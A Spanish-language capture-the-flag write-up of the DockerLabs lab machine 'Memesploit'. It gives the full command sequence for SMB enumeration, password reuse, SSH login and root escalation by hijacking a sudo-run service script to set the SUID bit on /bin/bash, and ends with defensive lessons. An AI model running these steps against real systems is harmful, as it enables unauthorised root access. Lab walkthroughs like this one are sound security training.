# Memesploit — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** d1se0  
**Fecha de creación:** 01/09/2024  
**Técnicas:** SMB Enumeration · Hidden Text Disclosure · ZIP Password Reuse · SSH · Writable Script Abuse · sudo service abuse · SUID escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web y SMB](#2-enumeración-web-y-smb)
3. [Obtención de credenciales](#3-obtención-de-credenciales)
4. [Acceso SSH — usuario memesploit](#4-acceso-ssh--usuario-memesploit)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh memesploit.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
139/tcp open netbios-ssn
445/tcp open microsoft-ds
```

Servicios detectados:

```text
SSH
HTTP
SMB
```

---

## 2. Enumeración web y SMB

Accedemos al servidor web y observamos una página temática estilo hacker.

Seleccionando el texto de la página descubrimos palabras ocultas dentro del contenido.

Estas frases ocultas serán utilizadas posteriormente como posibles contraseñas.

Realizamos enumeración SMB:

```bash
enum4linux -a 172.17.0.2
```

Resultado:

```text
share_memehydra
```

También encontramos usuarios válidos:

```text
memesploit
memehydra
```

Accedemos al recurso SMB:

```bash
smbclient //172.17.0.2/share_memehydra -U memehydra
```

Utilizamos como contraseña una de las frases ocultas encontradas en la web.

Acceso correcto.

Listamos el contenido:

```bash
ls
```

Resultado:

```text
secret.zip
```

Descargamos el archivo:

```bash
get secret.zip
```

---

## 3. Obtención de credenciales

Intentamos extraer el ZIP:

```bash
unzip secret.zip
```

El archivo requiere contraseña.

Probamos nuevamente una de las frases ocultas de la página web.

Resultado:

```text
inflating: secret.txt
```

Leemos el contenido:

```bash
cat secret.txt
```

Resultado:

```text
memesploit:metasploitelmejor
```

---

## 4. Acceso SSH — usuario memesploit

Accedemos mediante SSH:

```bash
ssh memesploit@172.17.0.2
```

Contraseña:

```text
metasploitelmejor
```

Acceso correcto.

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
```

Buscamos el directorio relacionado:

```bash
find / -name 'login_monitor' 2>/dev/null
```

Resultado:

```text
/etc/init.d/login_monitor
/etc/login_monitor
```

Exploramos el contenido:

```bash
cd /etc/login_monitor
ls -la
```

Resultado:

```text
actionban.sh
activity.sh
network.sh
security.sh
```

El script principal utilizado por el servicio es:

```text
actionban.sh
```

---

## 5. Escalada de privilegios

Comprobamos permisos del directorio:

```bash
id
```

Resultado:

```text
groups=1001(memesploit),100(users),1003(security)
```

El directorio pertenece al grupo:

```text
security
```

Y nuestro usuario forma parte del mismo grupo.

Aprovechamos esto para reemplazar el script:

```bash
cp actionban.sh actionban.sp
rm actionban.sh
mv actionban.sp actionban.sh
```

Ahora tenemos permisos de escritura sobre el nuevo archivo.

Editamos el script:

```bash
nano actionban.sh
```

Añadimos al final:

```bash
chmod u+s /bin/bash
```

Ejecutamos el servicio como root:

```bash
sudo /usr/sbin/service login_monitor restart
```

Verificamos permisos:

```bash
ls -la /bin/bash
```

Resultado:

```text
-rwsr-xr-x
```

Ejecutamos Bash preservando privilegios:

```bash
bash -p
```

Verificamos acceso:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Información oculta en frontend | Descubrimiento de contraseñas |
| SMB expuesto | Acceso a archivos sensibles |
| Reutilización de contraseñas | Acceso inicial |
| Scripts gestionados por grupos inseguros | Escalada de privilegios |
| sudo sobre service | Ejecución privilegiada |
| Activación del bit SUID | Acceso persistente root |

**Para defenderse:**

- Evitar almacenar información sensible en frontend.
- Restringir acceso a recursos SMB.
- Aplicar políticas robustas de contraseñas.
- Auditar permisos de grupos sobre scripts críticos.
- Limitar comandos sudo peligrosos.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
